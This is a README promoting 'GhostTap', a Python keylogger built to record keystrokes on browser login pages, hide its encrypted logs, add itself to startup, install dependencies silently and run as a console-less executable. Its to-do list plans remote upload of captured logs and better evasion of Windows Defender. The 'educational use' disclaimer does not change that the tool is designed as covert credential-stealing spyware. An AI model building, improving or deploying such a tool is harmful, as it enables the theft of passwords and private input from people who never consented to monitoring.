
# 👻 GhostTap - Intelligent Encrypted Keylogger

**GhostTap** is a stealthy, encrypted, and intelligent keylogger that:
- Logs keystrokes only from login-related pages in web browsers.
- Encrypts all captured data with `Fernet` symmetric encryption.
- Sets itself to run at startup.
- Can decrypt logs securely using password authentication.
- Is stealthy and cross-platform in design.

---

## ⚙️ Features

- 🔐 AES-128-level encryption with Fernet
- 🧠 Smart: Logs only on login pages (e.g., `Sign in`, `Password`, `Login`)
- 🌐 Detects browser activity (Chrome, Firefox, Edge, Brave, Opera)
- 📦 Auto-installs dependencies silently
- 👣 Stores logs in hidden directories
- 🔁 Runs at system startup
- 🧩 Works silently in background
- 🔓 Secure decryption tool with password protection and hash validation

---

## 🚀 Setup & Usage

### 1. 🔧 Installation

> ⚠️ Python 3.8+ required (recommended: 3.10+)

```bash
git clone https://github.com/yourusername/ghosttap.git
cd ghosttap
```

### 2. 📦 Make it Executable (Optional)

Convert it to `.exe` (for Windows) using PyInstaller:

```bash
pip install pyinstaller
pyinstaller --noconfirm --onefile --noconsole ghosttap.py
```

Place the `.exe` anywhere and run it — GhostTap will:
- Install dependencies
- Generate encryption key (if not exists)
- Hide log files
- Add itself to system startup

---

## 🔑 Setting Up Password for Decryption

To change the decryption password:

1. Run this Python snippet:

```python
import hashlib
print(hashlib.sha256("yourpassword".encode()).hexdigest())
```

2. Replace the value of `HASHED_PASSWORD` in `decryptor.py`:

```python
HASHED_PASSWORD = "your_generated_hash_here"
```

Now only the person with the correct password can decrypt the logs.

---

## 🧠 How It Works

### 🔍 Behavior Overview

| Step                         | Action                                                                 |
|------------------------------|------------------------------------------------------------------------|
| 1. Starts silently           | Installs dependencies, hides itself, starts logging                   |
| 2. Detects active window     | Monitors title bar of the foreground window                           |
| 3. Matches login terms       | Logs keys **only** if page seems like a login page in a browser       |
| 4. Encrypts each keystroke   | Logs are stored encrypted with timestamp & source (e.g., website)     |
| 5. Sets startup task         | Automatically reruns itself on every boot                             |

---

## 🧰 Tools Used

- `pynput` – for global keyboard monitoring
- `cryptography` – for Fernet encryption/decryption
- `pywin32` – for Windows title bar detection
- `os`, `time`, `platform`, `hashlib` – core functionality

---

## 🔓 Decrypting the Logs

Use `decryptor.py` to securely decrypt logs:

```bash
python decryptor.py
```

You’ll be asked for the decryption password. It will output a readable `.txt` file with decrypted logs.

---

## ✅ Pros

- ✅ Logs **only login-related** activity (less noisy)
- ✅ Strong encryption for logs
- ✅ Hidden files & auto-start make it stealthy
- ✅ Password-protected decryption for safety
- ✅ Customizable for ethical use or security audits

---

## ❌ Cons

- ❌ Not cross-platform in GUI detection (currently Windows-focused)
- ❌ Detection by antivirus is possible
- ❌ Not intended for malicious purposes
- ❌ GUI detection may fail in non-English locales

---

## ⚠️ Legal & Ethical Note

> **GhostTap is for educational and ethical research only. Do not use this software on machines you do not own or have explicit permission to monitor. Misuse can lead to criminal charges.**

---

## 📬 License

MIT License © 2025 [Your Name]

---

## 🙏 Acknowledgments

Thanks to:
- The creators of `pynput` and `cryptography`
- Open source community
- Educators and researchers promoting cybersecurity awareness

---

## 📌 To-Do

- [ ] Add Linux/macOS support
- [ ] Add GUI (Tkinter) for log viewer
- [ ] Add auto-upload option to remote server
- [ ] Improve stealth on Windows Defender

---
